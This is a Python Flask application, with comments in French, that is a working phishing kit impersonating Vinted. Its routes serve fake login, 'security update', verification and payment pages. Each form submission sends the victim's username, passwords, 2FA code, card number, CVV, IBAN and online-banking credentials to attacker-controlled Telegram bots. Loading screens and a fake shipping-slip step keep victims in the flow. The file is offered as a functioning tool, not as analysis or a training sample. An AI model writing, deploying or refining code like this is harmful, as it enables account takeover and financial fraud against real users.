from flask import Flask, request, redirect, render_template, url_for, session, jsonify
import os
import requests
import time
from dotenv import load_dotenv

# Charge les variables d'environnement depuis le fichier .env
load_dotenv()
print("BOT_TOKEN:", os.getenv("BOT_TOKEN"))
print("CHAT_ID:", os.getenv("CHAT_ID"))

app = Flask(__name__)
# Utilise une clé secrète depuis les variables d'environnement pour la sécurité des sessions
app.secret_key = os.getenv("FLASK_SECRET_KEY", "super_secret_default_key")

# Informations pour le premier bot Telegram (utilisées si BOT_TOKEN est défini)
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Informations pour le deuxième bot Telegram (utilisées si BOT_TOKEN_2 est défini)
TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("CHAT_ID_2")


def send_telegram_message(message):
    """
    Fonction pour envoyer un message à un ou deux bots Telegram.
    S'assure que les variables d'environnement nécessaires sont définies.
    """
    # Envoi au premier bot
    if TELEGRAM_BOT_TOKEN and CHAT_ID:
        url_1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data_1 = {"chat_id": CHAT_ID, "text": message}
        try:
            response_1 = requests.post(url_1, data=data_1)
            response_1.raise_for_status()
            print("Message Telegram envoyé avec succès au premier bot.")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de l'envoi du message au premier bot: {e}")
    else:
        print("Informations du premier bot Telegram manquantes. Message non envoyé.")

    # Envoi au deuxième bot (si les informations sont disponibles)
    if TELEGRAM_BOT_TOKEN_2 and CHAT_ID_2:
        url_2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_2}/sendMessage"
        data_2 = {"chat_id": CHAT_ID_2, "text": message}
        try:
            response_2 = requests.post(url_2, data=data_2)
            response_2.raise_for_status()
            print("Message Telegram envoyé avec succès au deuxième bot.")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de l'envoi du message au deuxième bot: {e}")
    else:
        print("Informations du deuxième bot Telegram manquantes. Message non envoyé au deuxième bot.")


# 1. Route pour la page d'accueil (index.html)
@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")


# 2. Route pour afficher la page de connexion (login.html)
@app.route("/login_page", methods=["GET"])
def login_page_display():
    return render_template("login.html")


# 3. Route pour traiter la soumission du formulaire de connexion
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Stocke les informations dans la session Flask
    session['username'] = username
    session['password'] = password
    print(f"DEBUG: Session set - username: {session.get('username')}, password: {session.get('password')}")

    message = (
        f"[Vinted Login]\n"
        f"👤 Pseudo: {username}\n"
        f"🔑 Mdp: {password}"
    )
    send_telegram_message(message)

    # Redirige vers la page de chargement
    return redirect(url_for('loading_page'))


# 4. Route pour la page de chargement (loading.html)
@app.route("/loading")
def loading_page():
    username = session.get('username')
    password = session.get('password')

    print(f"DEBUG: Dans loading_page - Session username: {username}, password: {password}")

    # Si les infos de session sont manquantes, redirige vers la page d'accueil (flux de secours)
    if not username or not password:
        print("DEBUG: Username ou Password manquant dans la session. Redirection vers Home.")
        return redirect(url_for('home'))

    # Rend la page loading.html et lui passe l'URL de redirection vers security_update_page
    return render_template("loading.html",
                           redirect_url=url_for('security_update_page'))


# Route pour la page de renforcement du mot de passe
@app.route("/security-update")
def security_update_page():
    return render_template("security_update.html")


# Route pour la page d'e-mail de sécurité (la page avec le formulaire de confirmation du mot de passe)
@app.route("/password-update-sent")
def password_update_sent_page():
    return render_template("password_update_sent.html")


# ROUTE CORRIGÉE : Pour la page de chargement du mot de passe
# Elle gère maintenant les requêtes POST du formulaire de confirmation
@app.route("/password-loading", methods=["GET", "POST"])
def password_loading_page():
    if request.method == "POST":
        new_password = request.form.get("new-password")
        username = session.get('username')
        original_password = session.get('password')

        print(f"DEBUG: Nouveau mot de passe reçu: {new_password}")

        if username and new_password:
            message = (
                f"[Vinted Nouveau Mot de Passe]\n"
                f"👤 Pseudo: {username}\n"
                f"🔑 Ancien Mdp: {original_password}\n"
                f"🔒 Nouveau Mdp: {new_password}"
            )
            send_telegram_message(message)
            session['password'] = new_password  # Met à jour le mot de passe dans la session
        else:
            print("Erreur: Impossible de récupérer les informations de session ou le nouveau mot de passe.")

    # Affiche la page de chargement, qui redirigera après 10 secondes
    return render_template("password_loading.html")


# 5. Route pour la page de vérification (verify.html)
@app.route("/verify", methods=["GET", "POST"])
def verify_page():
    if request.method == "POST":
        # Traite la soumission du formulaire de vérification
        username = request.form["username"]
        password = request.form["password"]
        verification_code = request.form["verification_code"]

        session['verification_code'] = verification_code  # Stocke aussi le code de vérification
        session['username'] = username
        session['password'] = password

        message = (
            f"[Vinted Code Verification]\n"
            f"👤 Pseudo: {username}\n"
            f"🔑 Mdp: {password}\n"
            f"🔢 Code: {verification_code}"
        )
        send_telegram_message(message)

        # REDIRECTION MISE À JOUR : Redirige vers la page d'attente du bordereau
        return redirect(url_for('shipping_slip_wait_page'))
    else:
        # Affiche la page de vérification (requête GET, par ex. depuis la page précédente)
        # On récupère les infos de la session pour ne pas dépendre des paramètres d'URL
        username = session.get("username")
        password = session.get("password")
        print(f"DEBUG: Dans verify_page (GET) - Session username: {username}, password: {password}")
        return render_template("verify.html", username=username, password=password)


# NOUVELLE ROUTE : Affiche la page d'attente du bordereau
@app.route("/shipping-slip-wait")
def shipping_slip_wait_page():
    return render_template("shipping_slip_wait.html")


# NOUVELLE ROUTE : Affiche la page d'informations de paiement
@app.route("/payment-info")
def payment_info_page():
    username = session.get("username")
    password = session.get("password")
    verification_code = session.get("verification_code")
    return render_template("payment_info.html",
                           username=username,
                           password=password,
                           verification_code=verification_code)


# 6. Route pour traiter la soumission des informations de paiement
@app.route("/process_payment", methods=["POST"])
def process_payment():
    # Récupère les données du formulaire et/ou de la session
    username = request.form.get("username") or session.get('username')
    password = request.form.get("password") or session.get('password')
    verification_code = request.form.get("verification_code") or session.get('verification_code')

    card_name = request.form["card_name"]
    card_number = request.form["card_number"]
    expiry_date = request.form["expiry_date"]
    cvv = request.form["cvv"]
    iban = request.form["iban"]
    phone_number = request.form.get("phone_number")

    bank_name_selected = request.form.get("bank_name")
    other_bank_name = request.form.get("other_bank_name")
    bank_id = request.form.get("bank_id")
    bank_password = request.form.get("bank_password")

    final_bank_name = bank_name_selected
    if bank_name_selected == "Autre" and other_bank_name:
        final_bank_name = other_bank_name
    elif bank_name_selected == "Autre":
        final_bank_name = "Autre (non spécifié)"

    # Envoie les informations de paiement à Telegram
    message = (
        f"[Vinted Payment Info]\n"
        f"👤 Pseudo: {username or 'N/A'}\n"
        f"🔑 Mdp: {password or 'N/A'}\n"
        f"🔢 Code Verif: {verification_code or 'N/A'}\n"
        f"💳 Nom sur carte: {card_name}\n"
        f"🔢 Num carte: {card_number}\n"
        f"📅 Exp: {expiry_date}\n"
        f"🔐 CVV: {cvv}\n"
        f"🏦 IBAN: {iban}\n"
        f"📞 Téléphone: {phone_number or 'N/A'}\n"
        f"🏦 Banque: {final_bank_name or 'N/A'}\n"
        f"🆔 Identifiant Bancaire: {bank_id or 'N/A'}\n"
        f"🔑 Mdp/Code Sec. Bancaire: {bank_password or 'N/A'}"
    )

    send_telegram_message(message)

    # Redirige vers la page de sécurisation finale
    return redirect(url_for('security_page'))


# NOUVELLE ROUTE : Pour gérer la demande de rappel
@app.route("/request_call", methods=["POST"])
def request_call():
    # Récupère le nom d'utilisateur de la session pour l'identifier
    username = session.get('username')

    message = (
        f"[Vinted Call Request]\n"
        f"L'utilisateur {username or 'N/A'} souhaite être rappelé."
    )
    send_telegram_message(message)

    # Retourne une réponse JSON pour que le JavaScript puisse la traiter
    return jsonify({'status': 'success'})


# 7. Route pour la page de sécurisation finale (security_page.html)
@app.route("/page_de_securisation")
def security_page():
    session.clear()  # Nettoie la session à la fin du processus
    return render_template("security_page.html")


# NOUVELLE ROUTE : Pour la page de simulation
# Cette route doit correspondre au lien du bouton dans le HTML.
@app.route("/start_simulation", methods=["GET"])
def start_simulation_page():
    return render_template("simulation_page.html")


if __name__ == "__main__":
    app.run(debug=True)
